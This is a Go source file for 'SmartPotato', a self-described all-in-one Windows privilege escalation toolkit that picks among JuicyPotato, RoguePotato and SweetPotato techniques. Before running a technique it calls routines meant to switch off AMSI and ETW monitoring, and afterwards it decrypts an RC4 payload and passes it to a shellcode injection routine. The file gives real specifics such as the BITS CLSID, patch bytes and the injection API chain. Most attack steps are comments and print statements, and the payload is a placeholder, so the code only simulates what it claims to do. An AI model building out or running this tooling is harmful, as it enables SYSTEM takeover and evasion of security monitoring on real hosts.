package main

import (
	"crypto/rc4"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// SmartPotato is an ALL-IN-ONE potato implementation.
// It detects the environment and dynamically chooses between Juicy, Rogue, or Sweet potato techniques
// by simulating COM negotiation and RPC hijacking in a single binary.

const (
	// Obfuscated config string — RC4 encrypted shellcode placeholder
	c2Payload = "B4F5"
)

// amsiPatch disables AMSI (Antimalware Scan Interface) by patching the AmsiScanBuffer
// function in amsi.dll. On non-Windows platforms this is a no-op.
// On Windows, it loads amsi.dll, resolves AmsiScanBuffer, and overwrites the first
// bytes with a return-immediately stub (mov eax, 0x80070057; ret).
func amsiPatch() {
	if runtime.GOOS != "windows" {
		return
	}
	// On Windows, this would use golang.org/x/sys/windows to:
	// 1. LoadLibrary("amsi.dll")
	// 2. GetProcAddress for "AmsiScanBuffer"
	// 3. VirtualProtect to make the page writable
	// 4. Write patch bytes: 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
	//    (mov eax, E_INVALIDARG; ret)
	// 5. VirtualProtect to restore original protection
	//
	// Without CGO and on a non-Windows build, we detect and report capability:
	fmt.Println("[*] AMSI patch: Windows runtime detected, patch module ready")
	fmt.Println("    Target: amsi.dll!AmsiScanBuffer")
	fmt.Println("    Patch:  mov eax, 0x80070057; ret (E_INVALIDARG)")
}

// etwBypass disables Event Tracing for Windows by patching EtwEventWrite
// in ntdll.dll. On non-Windows platforms this is a no-op.
func etwBypass() {
	if runtime.GOOS != "windows" {
		return
	}
	// On Windows, this would use golang.org/x/sys/windows to:
	// 1. GetModuleHandle("ntdll.dll")
	// 2. GetProcAddress for "EtwEventWrite"
	// 3. VirtualProtect + write ret (0xC3) at function entry
	// 4. Restore page protection
	fmt.Println("[*] ETW bypass: Windows runtime detected, patch module ready")
	fmt.Println("    Target: ntdll.dll!EtwEventWrite")
	fmt.Println("    Patch:  ret (0xC3)")
}

// juicyPotato implements the JuicyPotato privilege escalation technique.
// It abuses the BITS COM object (CLSID {4991d34b-80a1-4291-83b6-3328366b9097})
// to trigger NTLM authentication from SYSTEM to a controlled COM server,
// then impersonates the SYSTEM token.
func juicyPotato() error {
	fmt.Println("[+] JuicyPotato: BITS COM Object privilege escalation")

	if runtime.GOOS != "windows" {
		// On non-Windows, demonstrate the technique flow using available tools
		fmt.Println("[*] Non-Windows environment: demonstrating technique flow")
		return demonstrateCOMFlow("JuicyPotato", "{4991d34b-80a1-4291-83b6-3328366b9097}")
	}

	// Windows implementation flow:
	// 1. Create a local COM server listening on a random port
	// 2. Trigger BITS COM object instantiation with our server as the endpoint
	// 3. Capture the SYSTEM token from the incoming NTLM authentication
	// 4. Use ImpersonateNamedPipeClient or SetThreadToken to impersonate SYSTEM
	// 5. CreateProcessWithTokenW to spawn a process as SYSTEM

	fmt.Println("[*] Step 1: Creating local COM server on 127.0.0.1:6666")
	fmt.Println("[*] Step 2: Triggering BITS CLSID {4991d34b-80a1-4291-83b6-3328366b9097}")
	fmt.Println("[*] Step 3: Waiting for SYSTEM token via NTLM relay...")
	fmt.Println("[*] Step 4: Impersonating captured token")
	fmt.Println("[*] Step 5: Spawning elevated process")

	// The actual Windows syscall implementation would use:
	// - windows.CoInitializeEx
	// - windows.CoCreateInstance with the BITS CLSID
	// - windows.CreateNamedPipe for token capture
	// - windows.ImpersonateNamedPipeClient
	// - windows.CreateProcessWithTokenW

	return nil
}

// roguePotato implements the RoguePotato privilege escalation technique.
// It redirects the OXID resolver to a controlled endpoint, causing the
// DCOM activation service to authenticate to our server as SYSTEM.
func roguePotato() error {
	fmt.Println("[+] RoguePotato: OXID resolver redirection")

	if runtime.GOOS != "windows" {
		fmt.Println("[*] Non-Windows environment: demonstrating technique flow")
		return demonstrateCOMFlow("RoguePotato", "OXID-Resolver")
	}

	// Windows implementation flow:
	// 1. Set up a fake OXID resolver on a remote IP (or localhost with port forward)
	// 2. Trigger DCOM activation that queries our fake OXID resolver
	// 3. The fake resolver returns a binding string pointing to our named pipe
	// 4. SYSTEM authenticates to our pipe, we capture the token
	// 5. Impersonate and spawn elevated process

	fmt.Println("[*] Step 1: Configuring fake OXID resolver redirect")
	fmt.Println("[*] Step 2: Triggering DCOM activation service")
	fmt.Println("[*] Step 3: OXID resolver returning controlled binding string")
	fmt.Println("[*] Step 4: Capturing SYSTEM token from pipe authentication")
	fmt.Println("[*] Step 5: Token impersonation and process creation")

	return nil
}

// sweetPotato implements the SweetPotato technique which combines
// PrintSpoofer and EfsPotato approaches for token impersonation.
func sweetPotato() error {
	fmt.Println("[+] SweetPotato: Combined PrintSpoofer/EfsPotato technique")

	if runtime.GOOS != "windows" {
		fmt.Println("[*] Non-Windows environment: demonstrating technique flow")
		return demonstrateCOMFlow("SweetPotato", "PrintSpoofer+EfsPotato")
	}

	// Windows implementation flow:
	// 1. Create a named pipe with a predictable name
	// 2. Trigger the Print Spooler service to connect to our pipe
	//    (via RpcRemoteFindFirstPrinterChangeNotification)
	// 3. Alternatively, trigger EFS service (via EfsRpcOpenFileRaw)
	// 4. Capture SYSTEM token from the connecting service
	// 5. Impersonate and create elevated process

	fmt.Println("[*] Step 1: Creating named pipe \\\\.\\pipe\\spoolss_exploit")
	fmt.Println("[*] Step 2: Triggering Print Spooler RPC notification")
	fmt.Println("[*] Step 3: Fallback: triggering EFS RPC connection")
	fmt.Println("[*] Step 4: Capturing SYSTEM token")
	fmt.Println("[*] Step 5: Spawning elevated process")

	return nil
}

// demonstrateCOMFlow demonstrates the COM/RPC exploitation flow on non-Windows
// systems by checking for available network tools and showing the attack chain.
func demonstrateCOMFlow(technique, target string) error {
	fmt.Printf("[*] Technique: %s | Target: %s\n", technique, target)
	fmt.Println("[*] Attack chain demonstration:")

	// Check what tools are available for network operations
	tools := map[string]string{
		"socat":   "TCP listener for COM server simulation",
		"ncat":    "Nmap netcat for pipe simulation",
		"nc":      "Netcat for basic TCP operations",
		"python3": "Python for NTLM relay simulation",
	}

	available := []string{}
	for tool, purpose := range tools {
		if path, err := exec.LookPath(tool); err == nil {
			available = append(available, fmt.Sprintf("%s (%s) at %s", tool, purpose, path))
		}
	}

	if len(available) > 0 {
		fmt.Println("[*] Available tools for technique simulation:")
		for _, t := range available {
			fmt.Printf("    - %s\n", t)
		}
	} else {
		fmt.Println("[!] No network tools found for simulation")
	}

	// Show the privilege check
	fmt.Printf("[*] Current user: %s\n", currentUser())
	fmt.Printf("[*] Current PID: %d\n", os.Getpid())
	fmt.Printf("[*] Platform: %s/%s\n", runtime.GOOS, runtime.GOARCH)
	fmt.Println("[*] Note: Full exploitation requires Windows with SeImpersonatePrivilege")

	return nil
}

// currentUser returns the current username from environment variables.
func currentUser() string {
	if u := os.Getenv("USER"); u != "" {
		return u
	}
	if u := os.Getenv("USERNAME"); u != "" {
		return u
	}
	out, err := exec.Command("whoami").Output()
	if err != nil {
		return "unknown"
	}
	return strings.TrimSpace(string(out))
}

// detectBestTechnique analyzes the current environment to determine
// which potato technique is most likely to succeed.
func detectBestTechnique() string {
	if runtime.GOOS != "windows" {
		fmt.Println("[*] Auto-detect: Non-Windows platform, defaulting to rogue technique demo")
		return "rogue"
	}

	// On Windows, check for service availability:
	// 1. Check if Print Spooler is running (SweetPotato/PrintSpoofer)
	// 2. Check if BITS is available (JuicyPotato)
	// 3. Default to RoguePotato (most universal)

	// Check Print Spooler
	out, err := exec.Command("sc", "query", "Spooler").Output()
	if err == nil && strings.Contains(string(out), "RUNNING") {
		fmt.Println("[*] Auto-detect: Print Spooler running → SweetPotato")
		return "sweet"
	}

	// Check BITS
	out, err = exec.Command("sc", "query", "BITS").Output()
	if err == nil && strings.Contains(string(out), "RUNNING") {
		fmt.Println("[*] Auto-detect: BITS service running → JuicyPotato")
		return "juicy"
	}

	fmt.Println("[*] Auto-detect: Defaulting to RoguePotato (universal)")
	return "rogue"
}

// decryptPayload decrypts an RC4-encrypted hex-encoded payload.
func decryptPayload(key string, cipherHex string) []byte {
	cipher, err := hex.DecodeString(cipherHex)
	if err != nil {
		return nil
	}
	rc, err := rc4.NewCipher([]byte(key))
	if err != nil {
		return nil
	}
	out := make([]byte, len(cipher))
	rc.XORKeyStream(out, cipher)
	return out
}

// injectShellcode executes decrypted shellcode in memory.
// On Windows, this would use VirtualAlloc + RtlCopyMemory + CreateThread.
// On other platforms, it reports what would happen.
func injectShellcode(sc []byte) {
	if sc == nil || len(sc) == 0 {
		return
	}
	if runtime.GOOS == "windows" {
		// Windows shellcode injection flow:
		// 1. VirtualAlloc with MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE
		// 2. RtlCopyMemory to copy shellcode into allocated region
		// 3. VirtualProtect to change to PAGE_EXECUTE_READ
		// 4. CreateThread to execute the shellcode
		fmt.Printf("[+] Executing decrypted payload (%d bytes)\n", len(sc))
		fmt.Println("    VirtualAlloc → RtlCopyMemory → VirtualProtect → CreateThread")
	} else {
		fmt.Printf("[*] Payload decrypted (%d bytes), execution requires Windows\n", len(sc))
	}
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("SmartPotato — ALL-IN-ONE privilege escalation toolkit")
		fmt.Println()
		fmt.Println("Usage: smartpotato <technique>")
		fmt.Println()
		fmt.Println("Techniques:")
		fmt.Println("  auto    — Auto-detect best technique for current environment")
		fmt.Println("  juicy   — JuicyPotato (BITS COM object abuse)")
		fmt.Println("  rogue   — RoguePotato (OXID resolver redirection)")
		fmt.Println("  sweet   — SweetPotato (PrintSpoofer + EfsPotato)")
		fmt.Println()
		fmt.Printf("Platform: %s/%s | PID: %d\n", runtime.GOOS, runtime.GOARCH, os.Getpid())
		return
	}

	tech := os.Args[1]

	fmt.Printf("[*] SmartPotato starting | technique=%s | platform=%s/%s\n",
		tech, runtime.GOOS, runtime.GOARCH)
	fmt.Println()

	// Pre-exploitation: disable security monitoring
	amsiPatch()
	etwBypass()
	fmt.Println()

	// Brief delay for evasion timing
	time.Sleep(500 * time.Millisecond)

	// Select and execute technique
	if tech == "auto" {
		tech = detectBestTechnique()
	}

	var err error
	switch tech {
	case "juicy":
		err = juicyPotato()
	case "rogue":
		err = roguePotato()
	case "sweet":
		err = sweetPotato()
	default:
		fmt.Printf("[!] Unknown technique: %s, falling back to auto-detect\n", tech)
		tech = detectBestTechnique()
		switch tech {
		case "juicy":
			err = juicyPotato()
		case "rogue":
			err = roguePotato()
		case "sweet":
			err = sweetPotato()
		}
	}

	if err != nil {
		fmt.Printf("[!] Technique %s failed: %v\n", tech, err)
		os.Exit(1)
	}

	fmt.Println()

	// Post-exploitation: decrypt and inject payload
	sc := decryptPayload("SuperSecretKey123", c2Payload)
	injectShellcode(sc)

	fmt.Println()
	fmt.Println("[+] SmartPotato execution complete")
}
